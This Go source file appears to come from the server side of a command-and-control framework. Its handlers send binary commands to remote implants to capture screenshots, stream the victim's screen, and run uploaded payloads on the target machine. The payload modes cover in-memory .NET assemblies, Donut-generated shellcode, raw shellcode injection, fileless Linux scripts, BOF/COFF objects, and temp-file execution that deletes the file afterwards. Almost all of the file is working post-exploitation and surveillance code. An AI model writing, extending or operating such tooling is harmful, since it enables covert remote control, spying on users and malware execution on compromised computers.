package api

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/godonut"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"log"

	"net/http"
	"time"

	"BackendTemplate/pkg/utils/logx"
	"github.com/gin-gonic/gin"
)

// ===== client_screenshot(拆分自原 clients.go) =====

func TakeScreenshot(c *gin.Context) {
	var screenshotBody struct {
		Uid     string `json:"uid"`
		Quality int    `json:"quality"` // 0=低 1=中 2=高（默认 1 中）
	}
	if err := c.ShouldBindJSON(&screenshotBody); err != nil {
		log.Printf("TakeScreenshot - JSON解析失败: %v", err)
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 分辨率档位校验（0 低 / 1 中 / 2 高）
	if screenshotBody.Quality < 0 || screenshotBody.Quality > 2 {
		screenshotBody.Quality = 1
	}

	log.Printf("📷 开始截图请求 - UID: %s, 分辨率档位: %d", screenshotBody.Uid, screenshotBody.Quality)

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[screenshotBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("❌ TakeScreenshot失败 - 客户端未连接: %s", screenshotBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法截取屏幕",
			"disconnected": true,
			"uid":          screenshotBody.Uid,
		})
		return
	}

	log.Printf("✅ 客户端连接正常 - UID: %s", screenshotBody.Uid)

	// 创建截图队列
	queue := command.VarScreenshotQueue.GetOrCreateQueue(screenshotBody.Uid)
	log.Printf("📋 创建截图队列 - UID: %s", screenshotBody.Uid)

	// 记录截图命令上下文
	command.VarScreenshotQueue.SetScreenshotExpected(screenshotBody.Uid, true)

	// 发送截图命令到客户端（payload = 4B 档位，客户端按档位缩放/调质）
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.SCREENSHOT1))

	qualityBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(qualityBytes, uint32(screenshotBody.Quality))

	byteToSend := append(cmdTypeBytes, qualityBytes...)
	log.Printf("📡 发送SCREENSHOT1命令到客户端 - UID: %s, 命令号: %d, 档位: %d", screenshotBody.Uid, command.SCREENSHOT1, screenshotBody.Quality)
	sendcommand.SendFileUploadCommand(screenshotBody.Uid, byteToSend)

	// 创建一个context并设置超时时间（截图30秒）
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	log.Printf("⏳ 等待客户端响应 - UID: %s, 超时时间: 30秒", screenshotBody.Uid)

	// 等待从通道接收截图数据
	select {
	case screenshotData := <-queue:
		logx.Infof("✅ 截图成功 - UID: %s, 数据长度: %d\n", screenshotBody.Uid, len(screenshotData))
		// 成功后删除队列并清除命令上下文
		command.VarScreenshotQueue.RemoveQueue(screenshotBody.Uid)
		// 截图数据已经是base64格式的data URI，直接返回
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": screenshotData})
	case <-command.GetClientOfflineSignal(screenshotBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		log.Printf("❌ 截图超时 - UID: %s", screenshotBody.Uid)
		// 超时后删除队列并清除命令上下文
		command.VarScreenshotQueue.RemoveQueue(screenshotBody.Uid)
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "截图超时，请检查客户端状态"})
	}
}

// ExecuteBin Windows内存执行 API（tshell功能移植）

func ExecuteBin(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		c.JSON(200, gin.H{"status": 400, "data": "No file uploaded"})
		return
	}
	// 大小上限（100MB）：防止一次性读入内存导致 OOM
	const maxExecuteBinSize = 100 * 1024 * 1024
	if file.Size > maxExecuteBinSize {
		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": fmt.Sprintf("文件过大: %d bytes（上限 %d bytes）", file.Size, maxExecuteBinSize)})
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		c.JSON(200, gin.H{"status": 400, "data": "Unable to open file"})
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		c.JSON(200, gin.H{"status": 400, "data": "Unable to read file"})
		return
	}

	uid := c.PostForm("uid")
	args := c.PostForm("args")
	mode := c.PostForm("mode")

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
	database.AppendShellContent(uid, "$ "+mode+" "+file.Filename+" "+args+"\n")

	// 根据不同模式处理，并在处理完成后统一返回响应
	switch mode {
	case "execute-assembly":
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))

		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendFileUploadCommand(uid, byteToSend)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	case "inline-bin":
		var u database.Clients
		database.Engine.Where("uid = ?", uid).Get(&u)

		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
		if err != nil {
			errorMsg := fmt.Sprintf("Unable to generate shellcode for %s: %v\n\nInline Bin mode requires files that can be converted to shellcode.\n\nFor fscan.exe and similar tools, please:\n1. Use traditional file upload and execution\n2. Convert to shellcode format first\n3. Use a shellcode generator tool", file.Filename, err)
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": errorMsg})
			return
		}
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
		sendcommand.SendFileUploadCommand(uid, byteToSend)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	case "shellcode-inject":
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
		sendcommand.SendFileUploadCommand(uid, byteToSend)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	case "script":
		// Linux 脚本内存执行(fileless sh -s 管道): [4B len][script bytes][args]
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendFileUploadCommand(uid, byteToSend)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	case "binary":
		// Linux 二进制执行(/tmp 写执行删): [4B len][binary bytes][4B argsLen][args]
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		argsBytes := []byte(args)
		argsLenBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(argsLenBytes, uint32(len(argsBytes)))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxBin))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendFileUploadCommand(uid, byteToSend)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	case "bof":
		// BOF(COFF)内存执行: [4B len][coff bytes][4B argsLen][args]
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		argsBytes := []byte(args)
		argsLenBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(argsLenBytes, uint32(len(argsBytes)))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteBof))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendFileUploadCommand(uid, byteToSend)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	case "exec-file":
		// 文件执行(写临时文件->执行->捕获输出->删除;支持 Donut 无法转换的 Go/Rust PE)
		// 跨平台:Windows 写 .exe 到 %TEMP%;Linux 写无扩展名到 /tmp
		// payload 格式: [4B fileLen][file bytes][4B argsLen][args]
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		argsBytes := []byte(args)
		argsLenBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(argsLenBytes, uint32(len(argsBytes)))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteFile))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendFileUploadCommand(uid, byteToSend)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	default:
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Invalid execution mode"})
	}
}

func StartScreenMonitor(c *gin.Context) {
	var monitorBody struct {
		Uid       string `json:"uid"`
		FrameRate int    `json:"frameRate"` // 帧率，默认5FPS
	}

	if err := c.ShouldBindJSON(&monitorBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if monitorBody.Uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "UID不能为空"})
		return
	}

	// 默认5FPS
	if monitorBody.FrameRate <= 0 || monitorBody.FrameRate > 30 {
		monitorBody.FrameRate = 5
	}

	log.Printf("📺 开始屏幕监控 - UID: %s, 帧率: %d FPS", monitorBody.Uid, monitorBody.FrameRate)

	// 创建监控帧队列
	queue := command.VarMonitorFrameQueue.GetOrCreateQueue(monitorBody.Uid)
	_ = queue // 避免未使用变量警告

	// 构建命令数据：命令号 + 帧率
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.START_MONITOR))

	frameRateBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(frameRateBytes, uint32(monitorBody.FrameRate))

	byteToSend := append(cmdTypeBytes, frameRateBytes...)

	log.Printf("📡 发送START_MONITOR命令到客户端 - UID: %s, 命令号: %d, 帧率: %d", monitorBody.Uid, command.START_MONITOR, monitorBody.FrameRate)
	sendcommand.SendFileUploadCommand(monitorBody.Uid, byteToSend)

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "屏幕监控已启动", "frameRate": monitorBody.FrameRate})
}

// StopScreenMonitor 停止屏幕监控

func StopScreenMonitor(c *gin.Context) {
	var monitorBody struct {
		Uid string `json:"uid"`
	}

	if err := c.ShouldBindJSON(&monitorBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if monitorBody.Uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "UID不能为空"})
		return
	}

	log.Printf("⏹️ 停止屏幕监控 - UID: %s", monitorBody.Uid)

	// 构建命令数据
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.STOP_MONITOR))

	byteToSend := cmdTypeBytes

	log.Printf("📡 发送STOP_MONITOR命令到客户端 - UID: %s, 命令号: %d", monitorBody.Uid, command.STOP_MONITOR)
	sendcommand.SendFileUploadCommand(monitorBody.Uid, byteToSend)

	// 移除监控帧队列
	command.VarMonitorFrameQueue.Remove(monitorBody.Uid)

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "屏幕监控已停止"})
}

// GetMonitorFrame 获取监控帧数据（手动请求模式）

func GetMonitorFrame(c *gin.Context) {
	uid := c.Query("uid")
	if uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "UID不能为空"})
		return
	}

	// 【关键修复】检查是否正在处理请求，防止并发
	if command.VarMonitorFrameQueue.IsProcessing(uid) {
		log.Printf("⚠️ [监控帧] 检测到并发请求，拒绝处理 - UID: %s", uid)
		c.JSON(http.StatusTooManyRequests, gin.H{"error": "请求太频繁，请稍后再试"})
		return
	}

	// 检查监控是否已启动
	queue, exists := command.VarMonitorFrameQueue.GetQueue(uid)
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "监控未启动或已停止"})
		return
	}

	// 【关键修复】标记为正在处理
	command.VarMonitorFrameQueue.SetProcessing(uid, true)
	defer command.VarMonitorFrameQueue.SetProcessing(uid, false) // 确保最终释放

	log.Printf("📺 发送GET_MONITOR_FRAME命令到客户端 - UID: %s", uid)

	// 发送手动获取监控帧命令
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.GET_MONITOR_FRAME))

	sendcommand.SendFileUploadCommand(uid, cmdTypeBytes)

	// 设置较短的超时时间（30秒），给大数据包传输预留时间
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// 等待接收监控帧
	select {
	case frameData := <-queue:
		// 【修复完成】监控帧数据现在确实是base64格式的data URI，直接返回
		log.Printf("✅ [监控帧] 获取成功 - UID: %s, 数据大小: %d bytes", uid, len(frameData))
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": string(frameData)})
	case <-command.GetClientOfflineSignal(uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		// 超时，返回空数据
		log.Printf("⏰ [监控帧] 获取超时 - UID: %s", uid)
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "获取监控帧超时"})
	}
}

// BatchDeleteClients 批量删除客户端
